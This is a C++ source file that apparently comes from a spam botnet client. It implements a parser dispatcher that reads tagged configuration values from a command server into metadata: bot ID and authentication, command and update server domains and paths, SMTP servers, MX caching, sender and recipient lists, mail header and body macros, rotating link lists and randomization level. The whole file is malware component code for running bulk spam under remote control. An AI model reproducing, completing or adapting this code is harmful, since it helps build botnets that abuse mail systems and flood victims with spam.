#include "stdafx.h"
#include <typeinfo>
#include "type_selector.h"
namespace Parser
{

  TagTypeSelector::
	  TagTypeSelector(unsigned long _type):_inc_count(false)
  {
    this->_type = _type;
    
    for (int i = 1 ; i < ptr_count ; ++i  )
      ptr[ i ] = &TagTypeSelector::error_type;

    ptr[type_tags::NONE               ] = NULL;
	  ptr[type_tags::TID                ] = 
      &TagTypeSelector::get_tid;
    ptr[type_tags::THREADS            ] = 
      &TagTypeSelector::get_threads;
	  ptr[type_tags::TIMEOUT_SEND_RECV  ] = 
      &TagTypeSelector::get_timeout;
    ptr[type_tags::SLEEP              ] = 
      &TagTypeSelector::get_sleep;
    ptr[type_tags::MX_CACHE           ] = 
      &TagTypeSelector::get_mxcache;
    ptr[type_tags::LETTER_FORMAT      ] = 
      &TagTypeSelector::get_letter_form;
    ptr[type_tags::REPORT_FREQUENCY   ] = 
      &TagTypeSelector::get_report_freq;
	  ptr[type_tags::CHARSET            ] = 
      &TagTypeSelector::get_charset;
	  ptr[type_tags::MAIL_FROM          ] = 
      &TagTypeSelector::get_mail_from;
	  ptr[type_tags::MAIL_TO            ] = 
      &TagTypeSelector::get_mail_to;
    ptr[type_tags::SMTP_SERVERS       ] = 
      &TagTypeSelector::get_smtp_srv;
	  ptr[type_tags::BODY               ] = 
      &TagTypeSelector::get_body;
	  ptr[type_tags::HEADER             ] = 
      &TagTypeSelector::get_header;
    ptr[type_tags::HEADER_MAIL_MACROS ] = 
      &TagTypeSelector::get_head_macros;
    ptr[type_tags::BODY_MAIL_MACROS   ] = 
      &TagTypeSelector::get_body_macros;
    ptr[type_tags::MX_BAD_COUNT       ] = 
      &TagTypeSelector::get_mx_bad_count;
    ptr[type_tags::BOT_ID             ] = 
      &TagTypeSelector::get_bot_id;
    ptr[type_tags::BOT_AUTH           ] = 
      &TagTypeSelector::get_bot_auth;
    ptr[type_tags::HAVE_TASK          ] = 
      &TagTypeSelector::get_bot_task_present;
    ptr[type_tags::BOT_ID_EXIST       ] = 
      &TagTypeSelector::get_bot_id_exist;
    ptr[type_tags::BOT_ERROR          ] = 
      &TagTypeSelector::get_bot_ret_error;
    ptr[type_tags::BOT_SERVER_DOMAIN  ] = 
      &TagTypeSelector::get_bot_srv_domain;
    ptr[type_tags::BOT_SERVER_CMD     ] = 
      &TagTypeSelector::get_bot_srv_cmd;
    ptr[type_tags::BOT_UPD_DOMAIN     ] = 
      &TagTypeSelector::get_bot_upd_domain;
    ptr[type_tags::BOT_UPD_PATH       ] = 
      &TagTypeSelector::get_bot_upd_path;
    ptr[type_tags::MAIL_SUBJECT       ] = 
      &TagTypeSelector::get_mail_subj; 
    ptr[type_tags::RANDOMIZATION_LEVEL] = 
      &TagTypeSelector::get_rnd_level;
    ptr[type_tags::LINKS_ROTATE_LIST  ]  = 
      &TagTypeSelector::get_links_list;
    ptr[type_tags::LINKS_XCHG_COUNT ]  = 
      &TagTypeSelector::get_links_xchg_count;  
  }

//----------------------------------------------------	
  void 
  TagTypeSelector::
  error_type(const char *str,
			 meta_data_type &metadata)
  {
#ifdef DBG_PRINT_ON
    char error_msg[MAX_PATH];
    sprintf(error_msg,"buffer_str = %s",str);
    MessageBox(NULL,error_msg,"DEBUG",NULL);
#endif
  }
//----------------------------------------------------	
  void  
  TagTypeSelector::
  get_mail_subj( const char *str,meta_data_type &metadata)     
  {
    metadata.mail_subj = 
      t_mail_subj::convert( str );
  }
//----------------------------------------------------	
  void  
  TagTypeSelector::
  get_links_xchg_count( const char *str,meta_data_type &metadata)     
  {
    metadata.links_xchg_count = 
      t_links_xchg::convert( str );
  }
//----------------------------------------------------	
  void  
  TagTypeSelector::
  get_body_macros (const char *str,
  meta_data_type &metadata)
  {
    metadata.body_macros.push_back(
      t_body_macros::convert( str )
      );
  }
//----------------------------------------------------	
  void  
  TagTypeSelector::
  get_head_macros (const char *str,
  meta_data_type &metadata)
  {
    metadata.head_macros.push_back(
      t_head_macros::convert( str )
      );
  }
//----------------------------------------------------	
  void  
  TagTypeSelector::
  get_charset (const char *str,
                meta_data_type &metadata)
  {
    metadata.charset = t_charset::convert(str);
  }
//-----------------------------------------------------	
  void 
  TagTypeSelector::
  get_report_freq( const char *str,
			 meta_data_type &metadata)
  {
    metadata.rep_freq = t_rep_freq::convert(str);
  }
//-----------------------------------------------------	
  void 
  TagTypeSelector::
  get_threads(const char *str,
			 meta_data_type &metadata)
  {
    metadata.threads = t_threads::convert(str);
  }
//----------------------------------------------------	
  void 
  TagTypeSelector::
  get_tid	(const char *str,
  			 meta_data_type &metadata)
  {
    metadata.tid = t_tid::convert(str);
  }
//----------------------------------------------------	
  void 
  TagTypeSelector::
  get_rnd_level(const char *str,
  			 meta_data_type &metadata)
  {
    metadata.rand_level = t_rand_level::convert(str); 
  }
//----------------------------------------------------	
  void 
  TagTypeSelector::
  get_timeout	(const char *str,
				 meta_data_type &metadata)
  {    
	  metadata.timeout = t_timeout::convert(str);
  }
//----------------------------------------------------	
  void 
  TagTypeSelector::
  get_sleep	(const char *str,
				 meta_data_type &metadata)
  {
    metadata.sleep = t_sleep::convert(str);
  }
//----------------------------------------------------	
  void  
  TagTypeSelector:: 
  get_mx_bad_count(const char *str,meta_data_type &metadata)
  {
    metadata.mx_bad_count = t_mx_bad_count::convert(str);
  }
//----------------------------------------------------	
  void 
  TagTypeSelector::
  get_mxcache	(const char *str,
  			 meta_data_type &metadata)
  {
    metadata.mxcache = t_mxcache::convert(str);
  }  
//----------------------------------------------------	
  void 
  TagTypeSelector::
  get_letter_form  (const char *str,
  			  meta_data_type &metadata)
  {
    metadata.letter_form = t_letter_form::convert(str);
  }
//----------------------------------------------------
  void 
  TagTypeSelector::
  get_mail_from  (const char *str,
  			        meta_data_type &metadata)
  {
    metadata.mail_from.push_back( t_mail_from::convert(str) );
  }
//----------------------------------------------------
  void 
  TagTypeSelector::
  get_links_list(const char *str,
  			        meta_data_type &metadata)
  {
    metadata.links_rot.push_back(t_links_rot::convert(str));
  }

  void 
  TagTypeSelector::
  get_mail_to  (const char *str,
  			        meta_data_type &metadata)
  {
    metadata.mail_to.push_back( t_mail_to::convert(str) );
  }
//----------------------------------------------------
  void  
  TagTypeSelector::
  get_smtp_srv (const char *str,meta_data_type &metadata)
  {
    metadata.smtp_servers.insert(
      t_smtp_servers::convert(str));
  }
//----------------------------------------------------
  void
  TagTypeSelector::
  get_body(const char *str,
  			        meta_data_type &metadata)
  {
	  (_inc_count)?t_body::inc():metadata.body.insert(
		             t_body::getPair( t_body::get_count() , 
		             t_body::body::convert(str) ) );
  }
//----------------------------------------------------
  void  
  TagTypeSelector::
  get_bot_id (const char *str,meta_data_type &metadata)
  {
    metadata.bot_id = t_bot_id::convert(str);
  }
//----------------------------------------------------
  void  
  TagTypeSelector::
  get_bot_auth (const char *str,meta_data_type &metadata)
  {
    metadata.bot_auth = t_bot_auth::convert(str);
  }
//----------------------------------------------------
  void  
  TagTypeSelector::
  get_bot_task_present (const char *str,meta_data_type &metadata)
  {
    metadata.bot_task_present = 
      t_bot_task_present::convert(str);
  }
//----------------------------------------------------
  void  
  TagTypeSelector::
  get_bot_id_exist (const char *str,meta_data_type &metadata)
  {
    metadata.bot_id_exist = t_bot_id_exist::convert( str );
  }
//----------------------------------------------------
  void  
  TagTypeSelector::
  get_bot_ret_error (const char *str,meta_data_type &metadata)
  {
    metadata.bot_error = t_bot_error::convert( str );  
  }
//----------------------------------------------------
 void
 TagTypeSelector::
 get_bot_srv_domain 
 (const char *str,meta_data_type &metadata)
 {
   metadata.bot_dmn = t_bot_domain::convert( str ); 
 }
//----------------------------------------------------
 void
 TagTypeSelector::
 get_bot_srv_cmd
 (const char *str,meta_data_type &metadata)
 {
   metadata.bot_cmd = t_bot_cmd::convert( str ); 
 }
//----------------------------------------------------
 void
 TagTypeSelector::
 get_bot_upd_domain
 (const char *str,meta_data_type &metadata)
 {
   metadata.bot_upd_dmn = 
     t_bot_upd_domain::convert( str );
 }
//----------------------------------------------------
 void
 TagTypeSelector::
 get_bot_upd_path
 (const char *str,meta_data_type &metadata)
 {
   metadata.bot_upd_cmd =
     t_bot_upd_cmd::convert( str );
 }
//----------------------------------------------------
  void
  TagTypeSelector::
  get_header(const char *str,
  			        meta_data_type &metadata)
  {
	  (_inc_count)?t_header::inc():metadata.header.insert( 
		             t_header::getPair( t_header::get_count() , 
		             t_header::header::convert(str) ) );
  }
//----------------------------------------------------
  void
  TagTypeSelector::
  getMetadata(const std::string &str,
              meta_data_type &metadata,
			        bool inc_count)
  {
    if ( ( _type ) && ( _type < ptr_count ) )
	  {
 	    if ( ptr[_type] )
	    {      
		    _inc_count = inc_count;
        (this->*ptr[_type])(str.c_str(),metadata);
		    //сообщаем о том,
   	    //какие именно типы метаданных уже инициализированы
#ifdef DBG_PRINT_ON
        printf("PARSER::selector type = %d\n",_type);
#endif
		    metadata[_type] = true; 
	      metadata.last_tag_id = _type;
	    }
	  }
  }
//----------------------------------------------------	
};